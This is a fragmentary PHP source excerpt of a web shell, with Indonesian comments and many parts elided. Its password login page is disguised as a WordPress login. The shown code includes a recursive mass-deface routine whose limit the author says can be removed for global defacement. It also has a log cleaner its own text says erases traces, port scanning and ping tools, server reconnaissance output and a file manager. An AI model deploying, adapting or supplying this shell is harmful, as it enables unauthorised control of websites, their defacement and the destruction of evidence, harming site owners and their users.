...
// --- END ---
// --- CONFIG ---
$password = "your_strong_password_here"; // <<<default GANTI INI DENGAN PASSWORD ANDA su!
...
if (!isset($_SESSION['loggedin']) || $_SESSION['loggedin'] !== true) {
    if (isset($_POST['shell_password']) && $_POST['shell_password'] === $password) { // Use a distinct POST name
        $_SESSION['loggedin'] = true;
        header("Location: ?path=" . urlencode(isset($_GET['path']) ? $_GET['path'] : getcwd()));
        exit();
    } else {
        // Display WordPress-like login page(name default shell_password) 
        $login_error_message = '';
        if (isset($_POST['shell_password']) && $_POST['shell_password'] !== $password) {
            $login_error_message = '<div id="login_error"><strong>ERROR</strong>: Password salah.</div><br>';
        }
        ...
        <head>
            ...
            <style type="text/css">
                body.login {
                    background: #f0f0f0 !important; /* WP default bg */
                ...
                #login_error, .message, .success {
                    border-left: 4px solid #dc3232; /* Error color */
                    padding: 12px;
                    margin: 0 0 16px;
                ...
                h1 a {
                    background-image: url(https://upload.wikimedia.org/wikipedia/commons/9/93/Wordpress_Blue_logo.png);
                ...
                #nav #pass-reset { float: left; }
                #nav #backtoblog { float: right; }
            </style>
        </head>
        <body class="login wp-core-ui">
            <div id="login">
                ...
                <p id="backtoblog">
                    <a href="https://wordpress.org/"> &larr; Back to WordPress</a>
                </p>
            </div>
...
if(isset($_POST['start_mass_deface'])) {
    ...
    // Note: The recursive functions for mass deface still contain checks against $script_root_dir.
    // This is a safety measure to prevent mass defacing the ENTIRE system if the target directory is a parent.
    // If you explicitly want to mass deface globally, these checks need to be removed from functions sabun_massal_recursive and sabun_biasa_non_recursive.
    $script_root_dir = realpath(dirname(__FILE__)); // Get script's root dir for safety checks in mass deface
            ...
            foreach($dira as $dirb) {
                ...
                if(is_dir($dirc)) {
                    if(is_writable($dirc)) {
                        ...
                        sabun_massal_recursive($dirc,$namafile,$isi_script,$results_arr, $allowed_base_dir_for_deface); // Pass new param
                    } else {
...
if (isset($_SESSION['feature_output']) && !empty($_SESSION['feature_output'])) {
    ...
    echo '<pre>' . $_SESSION['feature_output'] . '</pre>'; //setelah clear klik logonya y
    echo '</div>';
}
?>
<style>
...
<td class="label-icon"><i class='fa fa-cog'></i> Web Server</td>
  ...
  <tr>
    ...
    <td>: <span class="value"><?php echo php_uname(); ?></span></td>
  </tr>
  <tr>
    <td class="label-icon"><i class='fa fa-code'></i> PHP Version</td>
    <td>: <span class="value"><?php echo phpversion(); ?></span></td>
  </tr>
 <tr>
  ...
  <tr>
<td class="label-icon"><i class='fa fa-tachometer'></i> Load Average</td>
    <td>: <span class="value">
      <?php
        $load = sys_getloadavg();
  ...
  <tr>
<td class="label-icon"><i class='fa fa-globe'></i> User Agent</td>
    <td>: <span class="value"><?php echo $_SERVER['HTTP_USER_AGENT']; ?></span></td>
  </tr>
</table>
<div class="main-menu">
    ...
    <br><a href="?logout=true">[Logout]</a></div>
...
if (isset($_GET['action'])) {
    ...
    switch ($current_action) {
        ...
        case 'log_cleaner_form':
            ...
            // Output handled by general display block above
            echo '<form method="POST">
            <p><strong>Peringatan:</strong> Membersihkan log bisa menghapus jejak penting.</p><br>
            <input type="submit" name="clean_logs_submit" value="Bersihkan Log (Linux Umum)" style="width: 100%;">
            </form>';
            echo '</div>';
            break;
        case 'ping_form': // Ping Tool Form
            $show_file_list = false;
            echo '<div class="section-box">';
            ...
            echo '</div>';
            break;
        case 'portscan_form': // Port Scanner Form
            $show_file_list = false;
            echo '<div class="section-box">';
            ...
            echo '</div>';
            break;
        case 'dns_lookup_form': // DNS Lookup Form
            $show_file_list = false;
            echo '<div class="section-box">';
...
if ($show_file_list) {
    ...
    foreach($scandir_items as $item){
        ...
        <select name=\"opt_action\" style=\"margin-top:6px;width:100px;font-family:Kelly Slab;font-size:15px;background:black;color:<?php echo $theme_fg; ?>;border:2px solid <?php echo $theme_fg; ?>;border-radius:5px\" onchange=\"";
